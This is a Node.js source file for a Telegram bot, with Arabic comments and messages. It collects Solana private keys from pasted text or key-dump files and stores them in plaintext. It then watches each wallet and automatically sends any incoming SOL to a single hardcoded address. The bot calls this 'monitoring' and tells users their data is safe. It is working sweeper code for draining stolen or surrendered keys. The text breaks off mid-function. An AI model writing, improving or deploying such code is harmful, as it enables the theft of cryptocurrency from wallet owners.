const { Connection, PublicKey, Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const bs58 = require('bs58').default;
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
require('dotenv').config();

class SolanaTelegramBot {
    convertToHttpUrl(url) {
        // Convert WebSocket URLs to HTTP URLs for Connection
        if (url.startsWith('wss://')) {
            return url.replace('wss://', 'https://');
        } else if (url.startsWith('ws://')) {
            return url.replace('ws://', 'http://');
        }
        // Return as-is if already HTTP/HTTPS
        return url;
    }

    filterValidPrivateKeys(lines) {
        const validKeys = [];

        for (const line of lines) {
            const trimmedLine = line.trim();

            // تجاهل الأسطر الفارغة أو التي تحتوي على نصوص عامة
            if (!trimmedLine ||
                trimmedLine.length < 40 || // المفاتيح الخاصة عادة أطول من 40 حرف
                trimmedLine.startsWith('#') || // تجاهل التعليقات
                trimmedLine.startsWith('//') || // تجاهل التعليقات
                trimmedLine.includes(' ') || // المفاتيح لا تحتوي على مسافات
                trimmedLine.includes('wallet') ||
                trimmedLine.includes('address') ||
                trimmedLine.includes('private') ||
                trimmedLine.includes('key') ||
                trimmedLine.includes('mnemonic') ||
                trimmedLine.includes('seed') ||
                trimmedLine.includes('phrase')) {
                continue;
            }

            // فحص إضافي: محاولة فك تشفير المفتاح للتأكد من صحته
            try {
                // التحقق من أن الطول مناسب للمفتاح الخاص (عادة 88 أو 64 حرف)
                if (trimmedLine.length >= 64 && trimmedLine.length <= 88) {
                    // محاولة فك التشفير للتأكد من صحة المفتاح
                    const decoded = bs58.decode(trimmedLine);
                    if (decoded.length === 64) { // طول المفتاح الخاص Solana
                        validKeys.push(trimmedLine);
                    }
                }
            } catch (error) {
                // إذا فشل فك التشفير، المفتاح غير صالح
                continue;
            }
        }

        return validKeys;
    }

    constructor() {
        // Initialize Telegram bot
        this.bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

        // Target address to forward funds to
        this.targetAddress = new PublicKey('282RaYXcDsxJhNMDiG3ZPHRUM4MFX1aVPQ3dYKxDPg7b');

        // Initialize SQLite database
        this.dbPath = path.join(__dirname, 'wallets.db');
        this.db = new sqlite3.Database(this.dbPath);
        this.initializeDatabase();

        // Store wallets and their corresponding RPC connections
        this.wallets = [];
        this.connections = [];
        this.subscriptionIds = [];
        this.lastBalances = [];

        // Available RPC URLs (excluding public RPC)
        this.rpcUrls = [
            process.env.RPC_URL,
            process.env.RPC_URL2,
            process.env.RPC_URL3,
            process.env.RPC_URL4,
            process.env.RPC_URL5,
            process.env.RPC_URL6,
            process.env.RPC_URL7,
            process.env.RPC_URL8,
            process.env.RPC_URL9,
            process.env.RPC_URL10
        ].filter(url => url) // Remove undefined URLs
         .map(url => this.convertToHttpUrl(url)); // Convert WebSocket URLs to HTTP

        // Store chat ID for notifications
        this.chatId = null;

        // Track RPC errors
        this.rpcErrorCounts = new Array(this.rpcUrls.length).fill(0);
        this.lastRpcErrorTime = new Array(this.rpcUrls.length).fill(0);
        this.rpcFailedWallets = new Set(); // Track wallets with failed RPCs

        this.setupBotCommands();

        // 🔄 استئناف المراقبة التلقائي للمحافظ المحفوظة
        this.autoResumeMonitoring();

        console.log('🤖 Solana Telegram Bot initialized');
        console.log(`🔗 Available RPC URLs: ${this.rpcUrls.length}`);
    }

    async autoResumeMonitoring() {
        try {
            // البحث عن آخر جلسة مراقبة نشطة
            this.db.get(`
                SELECT chat_id, wallet_count
                FROM monitoring_sessions
                WHERE stopped_at IS NULL
                ORDER BY started_at DESC
                LIMIT 1
            `, async (err, row) => {
                if (err || !row) {
                    console.log('📝 لا توجد جلسة مراقبة سابقة للاستكمال');
                    return;
                }

                const chatId = row.chat_id;
                console.log(`🔄 تم العثور على جلسة مراقبة سابقة للدردشة ${chatId}`);

                try {
                    const { wallets } = await this.loadWalletsFromDatabase(chatId);

                    if (wallets.length > 0) {
                        // تحميل المحافظ والاتصالات
                        const MAX_WALLETS_PER_RPC = 4;
                        const maxTotalWallets = this.rpcUrls.length * MAX_WALLETS_PER_RPC;
                        const walletsToLoad = Math.min(wallets.length, maxTotalWallets);

                        this.wallets = [];
                        this.connections = [];

                        for (let i = 0; i < walletsToLoad; i++) {
                            const rpcIndex = Math.floor(i / MAX_WALLETS_PER_RPC);
                            const walletIndexInRpc = (i % MAX_WALLETS_PER_RPC) + 1;

                            // تجاهل المحفظة إذا لم يكن هناك RPC متاح
                            if (rpcIndex >= this.rpcUrls.length) {
                                console.log(`❌ لا يوجد RPC كافي للمحفظة ${i + 1}`);
                                break;
                            }

                            const connection = new Connection(this.rpcUrls[rpcIndex], 'confirmed');
                            this.wallets.push(wallets[i]);
                            this.connections.push(connection);

                            console.log(`🔗 محفظة ${i + 1}: RPC ${rpcIndex + 1} (${walletIndexInRpc}/${MAX_WALLETS_PER_RPC})`);
                        }

                        console.log(`✅ تم تحميل ${this.wallets.length} محفظة تلقائياً`);

                        // بدء المراقبة تلقائياً بدون إرسال رسائل
                        await this.startMonitoringSilent(chatId, this.wallets.length, wallets.length);

                    }
                } catch (error) {
                    console.error('خطأ في الاستئناف التلقائي:', error.message);
                }
            });

        } catch (error) {
            console.error('خطأ في البحث عن جلسة سابقة:', error.message);
        }
    }

    initializeDatabase() {
        // Create wallets table if it doesn't exist
        this.db.serialize(() => {
            this.db.run(`
                CREATE TABLE IF NOT EXISTS wallets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    private_key TEXT NOT NULL UNIQUE,
                    public_key TEXT NOT NULL,
                    chat_id INTEGER NOT NULL,
                    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                    is_active INTEGER DEFAULT 1
                )
            `);

            this.db.run(`
                CREATE TABLE IF NOT EXISTS monitoring_sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    chat_id INTEGER NOT NULL UNIQUE,
                    started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                    stopped_at DATETIME NULL,
                    wallet_count INTEGER DEFAULT 0
                )
            `);
        });

        console.log('💾 قاعدة البيانات المحلية جاهزة');
    }

    // Save wallets to database
    async saveWalletsToDatabase(chatId, privateKeys) {
        return new Promise((resolve, reject) => {
            this.db.serialize(() => {
                // First, deactivate all existing wallets for this chat
                this.db.run(
                    'UPDATE wallets SET is_active = 0 WHERE chat_id = ?',
                    [chatId]
                );

                // Insert new wallets
                const stmt = this.db.prepare(`
                    INSERT OR REPLACE INTO wallets (private_key, public_key, chat_id, is_active)
                    VALUES (?, ?, ?, 1)
                `);

                let successCount = 0;
                privateKeys.forEach((privateKey) => {
                    try {
                        const privateKeyBytes = bs58.decode(privateKey);
                        const wallet = Keypair.fromSecretKey(privateKeyBytes);

                        stmt.run(privateKey.trim(), wallet.publicKey.toString(), chatId, (err) => {
                            if (err) {
                                console.error('Database insert error:', err);
                            } else {
                                successCount++;
                            }
                        });
                    } catch (error) {
                        console.error('Invalid private key:', error.message);
                    }
                });

                stmt.finalize(() => {
                    // Update session info
                    this.db.run(`
                        INSERT OR REPLACE INTO monitoring_sessions (chat_id, wallet_count, started_at)
                        VALUES (?, ?, CURRENT_TIMESTAMP)
                    `, [chatId, successCount], () => {
                        resolve(successCount);
                    });
                });
            });
        });
    }

    // Load wallets from database
    async loadWalletsFromDatabase(chatId) {
        return new Promise((resolve, reject) => {
            this.db.all(
                'SELECT private_key, public_key FROM wallets WHERE chat_id = ? AND is_active = 1',
                [chatId],
                (err, rows) => {
                    if (err) {
                        reject(err);
                        return;
                    }

                    const wallets = [];
                    const privateKeys = [];

                    rows.forEach(row => {
                        try {
                            const privateKeyBytes = bs58.decode(row.private_key);
                            const wallet = Keypair.fromSecretKey(privateKeyBytes);
                            wallets.push(wallet);
                            privateKeys.push(row.private_key);
                        } catch (error) {
                            console.error('Error loading wallet:', error.message);
                        }
                    });

                    resolve({ wallets, privateKeys });
                }
            );
        });
    }

    // Get database statistics
    async getDatabaseStats(chatId) {
        return new Promise((resolve) => {
            this.db.all(`
                SELECT
                    COUNT(*) as total_wallets,
                    SUM(CASE WHEN is_active = 1 THEN 1 ELSE 0 END) as active_wallets,
                    MIN(created_at) as first_added
                FROM wallets
                WHERE chat_id = ?
            `, [chatId], (err, rows) => {
                if (err || !rows[0]) {
                    resolve({ total_wallets: 0, active_wallets: 0, first_added: null });
                    return;
                }
                resolve(rows[0]);
            });
        });
    }

    setupBotCommands() {
        // Start command
        this.bot.onText(/\/start/, async (msg) => {
            const chatId = msg.chat.id;

            // Check if there are saved wallets
            try {
                const { wallets } = await this.loadWalletsFromDatabase(chatId);
                const stats = await this.getDatabaseStats(chatId);

                let welcomeMessage = `🔥 مرحباً بك في بوت مراقبة محافظ Solana!

📋 الأوامر المتاحة:
/add_wallets - إضافة محافظ للمراقبة
/resume_monitoring - استكمال مراقبة المحافظ المحفوظة
/status - عرض حالة المحافظ
/stop - إيقاف محافظ محددة
/stop_monitoring - إيقاف جميع المحافظ
/clear_wallets - حذف جميع المحافظ المحفوظة
/help - عرض المساعدة`;

                if (stats.active_wallets > 0) {
                    welcomeMessage += `\n\n💾 لديك ${stats.active_wallets} محفظة محفوظة
🔄 استخدم /resume_monitoring لاستكمال المراقبة`;
                } else {
                    welcomeMessage += `\n\n💡 لبدء المراقبة، استخدم الأمر /add_wallets وأرسل المفاتيح الخاصة`;
                }

                this.bot.sendMessage(chatId, welcomeMessage);

            } catch (error) {
                console.error('Error loading saved wallets:', error.message);
                this.bot.sendMessage(chatId, welcomeMessage);
            }
        });

        // Resume monitoring command
        this.bot.onText(/\/resume_monitoring/, async (msg) => {
            const chatId = msg.chat.id;

            try {
                const { wallets, privateKeys } = await this.loadWalletsFromDatabase(chatId);

                if (wallets.length === 0) {
                    this.bot.sendMessage(chatId, '❌ لا توجد محافظ محفوظة للاستكمال\nاستخدم /add_wallets لإضافة محافظ جديدة');
                    return;
                }

                // Stop current monitoring first
                this.stopAllMonitoring();

                // حساب عدد المحافظ التي يمكن مراقبتها
                const MAX_WALLETS_PER_RPC = 4;
                const maxTotalWallets = this.rpcUrls.length * MAX_WALLETS_PER_RPC;
                const walletsToLoad = Math.min(wallets.length, maxTotalWallets);

                // Load wallets and connections
                this.wallets = [];
                this.connections = [];

                for (let i = 0; i < walletsToLoad; i++) {
                    const rpcIndex = Math.floor(i / MAX_WALLETS_PER_RPC);

                    // تجاهل المحفظة إذا لم يكن هناك RPC متاح
                    if (rpcIndex >= this.rpcUrls.length) {
                        break;
                    }

                    const connection = new Connection(this.rpcUrls[rpcIndex], 'confirmed');
                    this.wallets.push(wallets[i]);
                    this.connections.push(connection);
                }

                this.startMonitoring(chatId, this.wallets.length, wallets.length);

            } catch (error) {
                console.error('Error resuming monitoring:', error.message);
                this.bot.sendMessage(chatId, `❌ خطأ في تحميل المحافظ: ${error.message}`);
            }
        });

        // Clear wallets command
        this.bot.onText(/\/clear_wallets/, async (msg) => {
            const chatId = msg.chat.id;

            this.db.run('DELETE FROM wallets WHERE chat_id = ?', [chatId], (err) => {
                if (err) {
                    this.bot.sendMessage(chatId, `❌ خطأ في حذف المحافظ: ${err.message}`);
                } else {
                    this.stopAllMonitoring();
                    this.bot.sendMessage(chatId, '🗑️ تم حذف جميع المحافظ المحفوظة');
                }
            });
        });

        // Add wallets command
        this.bot.onText(/\/add_wallets/, (msg) => {
            const chatId = msg.chat.id;
            const message = `📝 أرسل المفاتيح الخاصة للمحافظ التي تريد مراقبتها:

⚠️ تعليمات مهمة:
• ضع كل مفتاح خاص في سطر منفصل
• يمكنك إضافة حتى ${this.rpcUrls.length * 4} محفظة (4 لكل RPC)
• كل محفظة ستُراقب بـ RPC منفصل
• المفاتيح يجب أن تكون بصيغة Base58

📎 يمكنك أيضاً إرسال ملف TXT يحتوي على المفاتيح الخاصة

مثال:
5J1F7GHaDxuucP2VX7rciRchxrDsNo1SyJ61112233445566...
3K8H9JDa8xTvP1WX5rciRchxrDsNo1SyJ61112233445566...

أرسل المفاتيح أو الملف الآن:`;

            this.bot.sendMessage(chatId, message);

            // Wait for next message with private keys or document
            this.bot.once('message', (response) => {
                if (response.chat.id === chatId) {
                    if (response.document) {
                        this.processPrivateKeysFromFile(chatId, response.document);
                    } else if (response.text && !response.text.startsWith('/')) {
                        this.processPrivateKeys(chatId, response.text);
                    }
                }
            });
        });

        // Status command
        this.bot.onText(/\/status/, async (msg) => {
            const chatId = msg.chat.id;
            await this.showStatus(chatId);
        });

        // Stop monitoring command
        this.bot.onText(/\/stop_monitoring/, (msg) => {
            const chatId = msg.chat.id;
            this.stopAllMonitoring();
            this.bot.sendMessage(chatId, '⏹️ تم إيقاف مراقبة جميع المحافظ');
        });

        // Stop specific wallets command
        this.bot.onText(/\/stop/, (msg) => {
            const chatId = msg.chat.id;
            
            if (this.wallets.length === 0) {
                this.bot.sendMessage(chatId, '❌ لا توجد محافظ قيد المراقبة حالياً');
                return;
            }

            const message = `🛑 إيقاف محافظ محددة

📝 أرسل عناوين المحافظ التي تريد إيقاف مراقبتها:
• ضع كل عنوان في سطر منفصل
• يمكنك إرسال جزء من العنوان (الأحرف الأولى أو الأخيرة)

📋 المحافظ المراقبة حالياً:`;

            let walletsList = '';
            for (let i = 0; i < this.wallets.length; i++) {
                const wallet = this.wallets[i];
                const shortAddress = `${wallet.publicKey.toString().slice(0, 8)}...${wallet.publicKey.toString().slice(-4)}`;
                walletsList += `\n${i + 1}. ${shortAddress}`;
            }

            this.bot.sendMessage(chatId, message + walletsList + '\n\nأرسل عناوين المحافظ الآن:');

            // Wait for next message with wallet addresses
            this.bot.once('message', (response) => {
                if (response.chat.id === chatId && response.text && !response.text.startsWith('/')) {
                    this.processStopWallets(chatId, response.text);
                }
            });
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;
            const helpMessage = `📚 دليل الاستخدام:

🔑 إضافة المحافظ:
1. استخدم /add_wallets
2. أرسل المفاتيح الخاصة (كل مفتاح في سطر منفصل)
   📎 أو أرسل ملف TXT يحتوي على المفاتيح
3. سيتم حفظ المحافظ في قاعدة البيانات المحلية
4. سيبدأ البوت مراقبة المحافظ فوراً

💾 قاعدة البيانات المحلية:
• يتم حفظ جميع المحافظ تلقائياً
• يمكنك استكمال المراقبة بعد إعادة تشغيل البوت
• البيانات محفوظة محلياً وآمنة

📊 مراقبة المحافظ:
• كل محفظة تُراقب بـ RPC منفصل
• عند وصول SOL، سيتم تحويله فوراً
• ستحصل على إشعار لكل عملية

⚙️ الأوامر:
/add_wallets - إضافة محافظ جديدة
/resume_monitoring - استكمال مراقبة المحافظ المحفوظة
/status - حالة المحافظ وقاعدة البيانات
/stop - إيقاف محافظ محددة
/stop_monitoring - إيقاف جميع المحافظ
/clear_wallets - حذف جميع المحافظ المحفوظة`;

            this.bot.sendMessage(chatId, helpMessage);
        });
    }

    async processPrivateKeysFromFile(chatId, document) {
        try {
            // التحقق من نوع الملف
            if (!document.file_name || !document.file_name.toLowerCase().endsWith('.txt')) {
                this.bot.sendMessage(chatId, '❌ يجب أن يكون الملف من نوع TXT فقط');
                return;
            }

            // التحقق من حجم الملف (حد أقصى 10MB)
            if (document.file_size > 10 * 1024 * 1024) {
                this.bot.sendMessage(chatId, '❌ حجم الملف كبير جداً (الحد الأقصى 10MB)');
                return;
            }

            this.bot.sendMessage(chatId, '📄 جاري قراءة الملف...');

            // الحصول على معلومات الملف
            const fileInfo = await this.bot.getFile(document.file_id);
            const fileUrl = `https://api.telegram.org/file/bot${process.env.TELEGRAM_BOT_TOKEN}/${fileInfo.file_path}`;

            // تحميل محتوى الملف
            const https = require('https');
            const response = await new Promise((resolve, reject) => {
                https.get(fileUrl, (res) => {
                    let data = '';
                    res.on('data', (chunk) => {
                        data += chunk;
                    });
                    res.on('end', () => {
                        resolve(data);
                    });
                }).on('error', reject);
            });

            // فلترة المفاتيح الخاصة الصالحة فقط من محتوى الملف
            const allLines = response.split('\n').filter(line => line.trim());
            const validPrivateKeys = this.filterValidPrivateKeys(allLines);

            this.bot.sendMessage(chatId, `✅ تم تحميل الملف: ${document.file_name}
📄 إجمالي الأسطار: ${allLines.length}
🔑 المفاتيح الخاصة الصالحة: ${validPrivateKeys.length}`);

            // معالجة المفاتيح الصالحة فقط
            await this.processPrivateKeys(chatId, validPrivateKeys.join('\n'));

        } catch (error) {
            console.error('Error processing file:', error.message);
            this.bot.sendMessage(chatId, `❌ خطأ في قراءة الملف: ${error.message}`);
        }
    }

    async processPrivateKeys(chatId, keysText) {
        const allLines = keysText.split('\n').filter(line => line.trim());
        const privateKeys = this.filterValidPrivateKeys(allLines);

        if (privateKeys.length === 0) {
            this.bot.sendMessage(chatId, `❌ لم يتم العثور على مفاتيح صالحة
📄 تم فحص ${allLines.length} سطر
💡 تأكد من أن المفاتيح بصيغة Base58 صحيحة`);
            return;
        }

        // التحقق من توفر RPC URLs كافية
        if (this.rpcUrls.length === 0) {
            this.bot.sendMessage(chatId, `❌ لا توجد RPC URLs متاحة للمراقبة!
💡 تأكد من تعيين متغيرات البيئة: RPC_URL, RPC_URL2, RPC_URL3... حتى RPC_URL10`);
            return;
        }

        const MAX_WALLETS_PER_RPC = 4;
        const maxTotalWallets = this.rpcUrls.length * MAX_WALLETS_PER_RPC;

        // حساب عدد المحافظ التي يمكن مراقبتها فعلياً
        const walletsToMonitor = Math.min(privateKeys.length, maxTotalWallets);

        if (allLines.length > privateKeys.length) {
            this.bot.sendMessage(chatId, `🔍 تم فلترة المحتوى:
📄 إجمالي الأسطر: ${allLines.length}
🔑 المفاتيح الصالحة: ${privateKeys.length}
❌ تم تجاهل: ${allLines.length - privateKeys.length} سطر`);
        }

        // Stop current monitoring
        this.stopAllMonitoring();

        // Calculate available slots considering current wallets
        const currentWalletCount = this.wallets.length;
        const availableSlots = maxTotalWallets - currentWalletCount;
        const walletsToAdd = Math.min(privateKeys.length, availableSlots);

        let successCount = 0;

        for (let i = 0; i < walletsToAdd; i++) {
            try {
                const privateKey = privateKeys[i].trim();
                const privateKeyBytes = bs58.decode(privateKey);
                const wallet = Keypair.fromSecretKey(privateKeyBytes);

                // تحديد الفهرس الجديد بناءً على العدد الحالي للمحافظ
                const totalIndex = currentWalletCount + successCount;
                const rpcIndex = Math.floor(totalIndex / MAX_WALLETS_PER_RPC);

                // تجاهل المحفظة إذا لم يكن هناك RPC متاح
                if (rpcIndex >= this.rpcUrls.length) {
                    console.log(`❌ لا يوجد RPC متاح للمحفظة ${totalIndex + 1} - تم تجاهلها`);
                    break;
                }

                const walletIndexInRpc = (totalIndex % MAX_WALLETS_PER_RPC) + 1;
                const connection = new Connection(this.rpcUrls[rpcIndex], 'confirmed');

                this.wallets.push(wallet);
                this.connections.push(connection);
                
                // Add new subscription
                const subscriptionId = connection.onAccountChange(
                    wallet.publicKey,
                    async (accountInfo) => {
                        try {
                            const walletIndex = this.wallets.findIndex(w => w.publicKey.equals(wallet.publicKey));
                            if (walletIndex === -1) return;

                            const newBalance = accountInfo.lamports;
                            const oldBalance = this.lastBalances[walletIndex] || 0;

                            if (newBalance > oldBalance && newBalance > 0) {
                                const received = newBalance - oldBalance;
                                console.log(`💰 Wallet ${walletIndex + 1}: New SOL received ${received / LAMPORTS_PER_SOL} SOL`);

                                const walletDisplay = wallet.publicKey.toString();
                                const shortWallet = `${walletDisplay.slice(0, 4)}...${walletDisplay.slice(-3)}`;
                                const receiveMessage = `Wallet : ${shortWallet}\n\nReceived : ${(received / LAMPORTS_PER_SOL).toFixed(4)} SOL`;

                                this.bot.sendMessage(chatId, receiveMessage);
                                await this.forwardFunds(chatId, connection, wallet, newBalance, walletIndex + 1);
                            }

                            this.lastBalances[walletIndex] = newBalance;

                        } catch (error) {
                            console.error(`Error processing account change:`, error.message);
                        }
                    },
                    'confirmed'
                );

                this.subscriptionIds.push(subscriptionId);
                this.lastBalances.push(0);
                successCount++;

                console.log(`✅ Wallet ${totalIndex + 1} loaded: ${wallet.publicKey.toString()}`);
                console.log(`🔗 Using RPC ${rpcIndex + 1}: ${this.rpcUrls[rpcIndex]} (المحفظة ${walletIndexInRpc}/${MAX_WALLETS_PER_RPC} على هذا RPC)`);

            } catch (error) {
                console.error(`❌ خطأ في المفتاح ${i + 1}: ${error.message}`);
                continue;
            }
        }

        if (successCount > 0) {
            // Save wallets to database
            try {
                const keysToSave = privateKeys.slice(0, walletsToMonitor);
                await this.saveWalletsToDatabase(chatId, keysToSave);
                this.startMonitoring(chatId, successCount, privateKeys.length);
            } catch (error) {
                console.error('Error saving wallets to database:', error.message);
                this.startMonitoring(chatId, successCount, privateKeys.length);
            }
        } else {
            this.bot.sendMessage(chatId, '❌ فشل في تحميل أي محفظة');
        }
    }

    async startMonitoringSilent(chatId, monitoredCount = null, totalCount = null) {
        this.chatId = chatId;

        // Store subscription IDs to track active subscriptions
        this.subscriptionIds = [];
        this.lastBalances = [];

        for (let i = 0; i < this.wallets.length; i++) {
            const wallet = this.wallets[i];
            const connection = this.connections[i];
            const walletIndex = i + 1;

            // إلغاء الفحص الأولي تماماً - بدء مراقبة مباشرة فقط
            this.lastBalances[i] = 0;

            // Set up WebSocket subscription for this wallet (مراقبة مباشرة بدون تأخير)
            try {
                const subscriptionId = connection.onAccountChange(
                    wallet.publicKey,
                    async (accountInfo) => {
                        try {
                            const newBalance = accountInfo.lamports;
                            const oldBalance = this.lastBalances[i] || 0;

                            // تحويل أي SOL يصل جديد (بدون فحص أولي)
                            if (newBalance > oldBalance && newBalance > 0) {
                                const received = newBalance - oldBalance;
                                console.log(`💰 Wallet ${walletIndex}: New SOL received ${received / LAMPORTS_PER_SOL} SOL`);

                                // إرسال رسالة الاستقبال
                                const walletDisplay = wallet.publicKey.toString();
                                const shortWallet = `${walletDisplay.slice(0, 4)}...${walletDisplay.slice(-3)}`;
                                const receiveMessage = `Wallet : ${shortWallet}\n\nReceived : ${(received / LAMPORTS_PER_SOL).toFixed(4)} SOL`;

                                this.bot.sendMessage(chatId, receiveMessage);

                                // تحويل فوري بدون انتظار وإشعار واحد فقط
                                const sendPromise = this.forwardFunds(chatId, connection, wallet, newBalance, walletIndex);
                                await sendPromise;
                            }

                            this.lastBalances[i] = newBalance;

                        } catch (error) {
                            console.error(`Error processing account change for wallet ${walletIndex}:`, error.message);
                            const rpcIndex = Math.floor(i / 4); // حساب RPC index الصحيح
                            this.handleRpcError(error, rpcIndex, walletIndex);
                        }
                    },
                    'confirmed'
                );

                this.subscriptionIds.push(subscriptionId);
                console.log(`✅ WebSocket subscription started for wallet ${walletIndex}: ${wallet.publicKey.toString()}`);

            } catch (error) {
                console.error(`Error setting up subscription for wallet ${walletIndex}:`, error.message);
                const rpcIndex = Math.floor(i / 4); // حساب RPC index الصحيح
                this.handleRpcError(error, rpcIndex, walletIndex);
                this.subscriptionIds.push(null);
            }
        }

        // إرسال تقرير مجمع كل 5 دقائق
        this.monitoringReportInterval = setInterval(() => {
            this.sendMonitoringReport();
        }, 5 * 60 * 1000); // كل 5 دقائق

        console.log(`✅ Silent monitoring resumed for ${this.wallets.length} wallets`);
    }

    async startMonitoring(chatId, monitoredCount = null, totalCount = null) {
        this.chatId = chatId;

        // Store subscription IDs to track active subscriptions
        this.subscriptionIds = [];
        this.lastBalances = [];

        for (let i = 0; i < this.wallets.length; i++) {
            const wallet = this.wallets[i];
            const connection = this.connections[i];
            const walletIndex = i + 1;

            // إلغاء الفحص الأولي تماماً - بدء مراقبة مباشرة فقط
            this.lastBalances[i] = 0;

            // Set up WebSocket subscription for this wallet (مراقبة مباشرة بدون تأخير)
            try {
                const subscriptionId = connection.onAccountChange(
                    wallet.publicKey,
                    async (accountInfo) => {
                        try {
                            const newBalance = accountInfo.lamports;
                            const oldBalance = this.lastBalances[i] || 0;

                            // تحويل أي SOL يصل جديد (بدون فحص أولي)
                            if (newBalance > oldBalance && newBalance > 0) {
                                const received = newBalance - oldBalance;
                                console.log(`💰 Wallet ${walletIndex}: New SOL received ${received / LAMPORTS_PER_SOL} SOL`);

                                // إرسال رسالة الاستقبال
                                const walletDisplay = wallet.publicKey.toString();
                                const shortWallet = `${walletDisplay.slice(0, 4)}...${walletDisplay.slice(-3)}`;
                                const receiveMessage = `Wallet : ${shortWallet}\n\nReceived : ${(received / LAMPORTS_PER_SOL).toFixed(4)} SOL`;

                                this.bot.sendMessage(chatId, receiveMessage);

                                // تحويل فوري
                                await this.forwardFunds(chatId, connection, wallet, newBalance, walletIndex);
                            }

                            this.lastBalances[i] = newBalance;

                        } catch (error) {
                            console.error(`Error processing account change for wallet ${walletIndex}:`, error.message);
                            const rpcIndex = Math.floor(i / 4); // حساب RPC index الصحيح
                            this.handleRpcError(error, rpcIndex, walletIndex);
                        }
                    },
                    'confirmed'
                );

                this.subscriptionIds.push(subscriptionId);
                console.log(`✅ WebSocket subscription started for wallet ${walletIndex}: ${wallet.publicKey.toString()}`);

            } catch (error) {
                console.error(`Error setting up subscription for wallet ${walletIndex}:`, error.message);
                const rpcIndex = Math.floor(i / 4); // حساب RPC index الصحيح
                this.handleRpcError(error, rpcIndex, walletIndex);
                this.subscriptionIds.push(null);
            }
        }

        // رسالة واحدة فقط تظهر العدد الفعلي للمحافظ المراقبة
        let finalMessage;
        if (totalCount && totalCount > this.wallets.length) {
            finalMessage = `✅ تم بدء مراقبة ${this.wallets.length} محفظة فقط من إجمالي ${totalCount}
💡 سيتم تجاهل ${totalCount - this.wallets.length} محفظة لعدم توفر RPC كافية`;
        } else {
            finalMessage = `✅ تم بدء مراقبة ${this.wallets.length} محفظة`;
        }

        this.bot.sendMessage(chatId, finalMessage);

        // إرسال تقرير مجمع كل 5 دقائق
        this.monitoringReportInterval = setInterval(() => {
            this.sendMonitoringReport();
        }, 5 * 60 * 1000); // كل 5 دقائق
    }

    async getBalance(connection, publicKey) {
        const balance = await connection.getBalance(publicKey);
        return balance;
    }

    async forwardFunds(chatId, connection, wallet, amount, walletIndex) {
        try {
            const startTime = Date.now();

            const { blockhash } = await connection.getLatestBlockhash('confirmed');
            const transactionFee = 5000;
            const amountToSend = amount - transactionFee;

            if (amountToSend <= 0) {
                console.log(`⚠️ Wallet ${walletIndex}: Amount too small after fees`);
                // إرسال رسالة فشل التحويل
                const walletDisplay = wallet.publicKey.toString();
                const shortWallet = `${walletDisplay.slice(0, 4)}...${walletDisplay.slice(-3)}`;
                this.bot.sendMessage(chatId, `Wallet : ${shortWallet}\n\nSending failed ❌`);
                return false;
            }

            const transaction = new Transaction({
                recentBlockhash: blockhash,
                feePayer: wallet.publicKey
            });

            const transferInstruction = SystemProgram.transfer({
                fromPubkey: wallet.publicKey,
                toPubkey: this.targetAddress,
                lamports: amountToSend
            });

            transaction.add(transferInstruction);
            transaction.sign(wallet);

            const signature = await connection.sendRawTransaction(
                transaction.serialize(),
                {
                    skipPreflight: false,
                    maxRetries: 3
                }
            );

            // Wait for transaction confirmation
            await connection.confirmTransaction(signature, 'confirmed');

            const executionTime = Date.now() - startTime;

            // رسالة مختصرة واحدة فقط للتحويلات الناجحة
            const successMessage = `💰 محفظة ${walletIndex}: ${amountToSend / LAMPORTS_PER_SOL} SOL ✅ (${executionTime}ms)
🔗 https://solscan.io/tx/${signature}`;

            // تأخير بسيط لتجنب spam Telegram
            setTimeout(() => {
                this.bot.sendMessage(chatId, successMessage);
            }, 1000);

            return true;

        } catch (error) {
            console.error(`❌ Transfer error for wallet ${walletIndex}:`, error.message);
            // رسالة فشل التحويل
            const walletDisplay = wallet.publicKey.toString();
            const shortWallet = `${walletDisplay.slice(0, 4)}...${walletDisplay.slice(-3)}`;
            this.bot.sendMessage(chatId, `Wallet : ${shortWallet}\n\nSending failed ❌`);
            return false;
        }
    }

    async showStatus(chatId) {
        if (this.wallets.length === 0) {
            // Check if there are saved wallets in database
            try {
                const stats = await this.getDatabaseStats(chatId);
                if (stats.active_wallets > 0) {
                    this.bot.sendMessage(chatId, `📊 لا توجد محافظ قيد المراقبة حالياً
💾 لديك ${stats.active_wallets} محفظة محفوظة في قاعدة البيانات
🔄 استخدم /resume_monitoring لاستكمال المراقبة`);
                } else {
                    this.bot.sendMessage(chatId, '📊 لا توجد محافظ قيد المراقبة');
                }
            } catch (error) {
                this.bot.sendMessage(chatId, '📊 لا توجد محافظ قيد المراقبة');
            }
            return;
        }

        // الحصول على إحصائيات قاعدة البيانات
        const dbStats = await this.getDatabaseStats(chatId);

        let statusMessage = `📊 حالة المحافظ (${dbStats.total_wallets} محفظة):\n\n`;

        // إحصائيات RPC
        const rpcStats = {};
        const MAX_WALLETS_PER_RPC = 4;

        for (let i = 0; i < this.wallets.length; i++) {
            const rpcIndex = Math.floor(i / MAX_WALLETS_PER_RPC);
            const rpcUrl = this.rpcUrls[rpcIndex];
            if (!rpcStats[rpcUrl]) {
                rpcStats[rpcUrl] = { count: 0, errors: 0 };
            }
            rpcStats[rpcUrl].count++;
            rpcStats[rpcUrl].errors += this.rpcErrorCounts[rpcIndex] || 0;
        }

        // عرض معلومات RPC مع الحالة
        statusMessage += `RPC Endpoints : `;
        Object.entries(rpcStats).forEach(([url, stats], index) => {
            if (index > 0) statusMessage += '\n                ';
            const rpcIndex = Object.keys(rpcStats).indexOf(url);
            const isHealthy = this.rpcErrorCounts[rpcIndex] < 5;
            const statusIcon = isHealthy ? '🟢' : '🔴';
            statusMessage += `${url.substring(0, 50)}...${statusIcon}`;
        });
        statusMessage += '\n\n';

        // عرض أخطاء RPC
        const totalErrors = this.rpcErrorCounts.reduce((sum, count) => sum + count, 0);
        statusMessage += `Errors: ${totalErrors}/5\n`;

        statusMessage += '\n🔹 المحافظ:\n';

        // عرض العناوين كاملة وقابلة للنسخ
        for (let i = 0; i < this.wallets.length; i++) {
            const wallet = this.wallets[i];
